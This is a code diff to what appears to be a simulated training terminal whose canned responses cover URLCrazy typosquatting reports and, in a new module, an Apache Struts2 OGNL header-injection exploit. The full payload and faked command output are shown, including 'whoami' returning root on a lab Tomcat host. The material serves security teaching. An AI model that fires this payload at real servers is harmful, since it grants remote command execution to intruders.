@@ -348,7 +348,7 @@ Double Replacement     twirrer.com                       199.59.243.225   UNITED
 Double Replacement     twiyyer.com                       199.59.243.225   UNITED STATES (US)
 Character Insertion    trwitter.com                      162.210.196.171  UNITED STATES (US)
 Character Insertion    tweitter.com                      69.162.80.62     UNITED STATES (US)
-Character Insertion    twiotter.com                      104.247.82.50    CANADA (CA)`,
+Character Insertion    twiotter.com                      104.247.82.50    CANADA (CA)\r\n`,
             'urlcrazy google.com': () => `
 URLCrazy Domain Report
 Domain    : google.com
@@ -407,10 +407,16 @@ Insert Dash            goog-le.com                      74.208.236.69    UNITED 
 Insert Dash            googl-e.com
 Insert Dash            google-.com
 Singular or Pluralise  googles.com
-Vowel Swap             gaagle.cam                       162.255.119.247  UNITED STATES (US)`,
+Vowel Swap             gaagle.cam                       162.255.119.247  UNITED STATES (US)\r\n`,
             'help-module5': () => `Available Module 5 Commands:\n- urlcrazy twitter.com\n- urlcrazy google.com\nFor more information on each command, please refer to the respective tool's documentation.\r\n`,
-            };
 
+            'curl --location --request GET https://192.168.1.58:8443/struts2-showcase/showcase.action -k -I': () => `HTTP/1.1 200 OK\nServer: Apache-Coyote/1.1\nSet-Cookie: JSESSIONID=1CF20D909CC5609C1CE7218FBD9B809F;\nPath=/struts2-showcase; Secure; HttpOnly\nContent-Type: text/html;charset=ISO-8859-1\nTransfer-Encoding: chunked\nDate: X\r\n`,
+            'cat exploit.txt': () => `curl --location --request GET 'https://192.168.1.58:8443/struts2-showcase/showcase.action' --header 'Content-Type: %{(#_='\''multipart/form-data'\'').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER _ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['\'' com.opensymphony.xwork2.ActionContext.container'\'']).(#ognlUtil=#contai ner.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUti l.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().cle ar()).(#context.setMemberAccess(#dm)))).(#cmd='\''pwd'\'').(#iswin=(@jav a.lang.System@getProperty('\''os.name'\'').toLowerCase().contains('\''wi n'\''))).(#cmds=(#iswin?{'\''cmd.exe'\'','\''/c'\'',#cmd}:{'\''/bin/bash '\'','\''-c'\'',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#proces s=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getRespons e().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.ge tInputStream(),#ros)).(#ros.flush())}' -k\r\n`,
+            './runexploit.sh pwd': () => `/usr/local/tomcat\ncurl: (18) transfer closed with outstanding read data remaining\r\n`,
+            './runexploit.sh ls': () => `BUILDING.txt\nCONTRIBUTING.md\nLICENSE\nNOTICE\nREADME.md\nRELEASE-NOTES\nRUNNING.txt\nbin\nconf\ninclude\nlib\nlogs\nnative-jni-lib\ntemp\nwebapps\nwork\ncurl: (18) transfer closed with outstanding read data remaining\r\n`,
+            './runexploit.sh whoami': () => `root\ncurl: (18) transfer closed with outstanding read data remaining\r\n`,
+            'help-module6': () => `Available Module 6 Commands:\n- curl --location --request GET https://192.168.1.58:8443/struts2-showcase/showcase.action -k -I\n- cat exploit.txt\n- ./runexploit.sh pwd\n- ./runexploit.sh ls\n- ./runexploit.sh whoami\r\n`
+            };
 
             if (command in commandResponses) {
                 const response = commandResponses[command];
